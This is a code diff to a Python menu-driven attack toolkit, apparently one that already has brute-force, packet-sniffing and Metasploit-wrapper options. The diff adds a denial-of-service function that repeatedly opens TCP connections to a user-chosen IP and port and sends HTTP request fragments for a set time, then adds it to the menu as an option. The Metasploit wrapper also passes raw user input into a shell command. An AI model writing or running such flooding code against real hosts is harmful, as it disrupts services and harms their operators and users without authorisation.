@@ -2,6 +2,9 @@ import os
 import time
 import hashlib
 import scapy.all as scapy
+import subprocess
+import socket
+import sys
 
 # Display logo as ASCII art
 def display_logo():
@@ -67,6 +70,22 @@ def metasploit_interface():
             # You can use os.system to run Metasploit commands
             os.system(f"msfconsole -q -x \"{msf_command}\"")
 
+# Denial of Service (DoS) attack
+def dos_attack(target_ip, target_port, duration=10):
+    print(f"\nStarting Denial of Service (DoS) attack on {target_ip}:{target_port} for {duration} seconds...\n")
+    start_time = time.time()
+
+    while time.time() - start_time < duration:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.send(b"GET / HTTP/1.1\r\n")
+            s.close()
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+    print(f"\n[+] DoS attack completed against {target_ip}:{target_port}")
+
 # Admin Tools
 def admin_tools():
     while True:
@@ -74,7 +93,8 @@ def admin_tools():
         print("1. Brute Force Attack")
         print("2. Packet Analyzer")
         print("3. Metasploit Interface")
-        print("4. Back to Main Menu")
+        print("4. Denial of Service (DoS) Attack")
+        print("5. Back to Main Menu")
 
         choice = input("\nChoose an option: ")
 
@@ -87,6 +107,11 @@ def admin_tools():
         elif choice == "3":
             metasploit_interface()
         elif choice == "4":
+            target_ip = input("Enter the target IP address: ")
+            target_port = int(input("Enter the target port: "))
+            duration = int(input("Enter attack duration in seconds: "))
+            dos_attack(target_ip, target_port, duration)
+        elif choice == "5":
             break
         else:
             print("Invalid choice, please try again.")
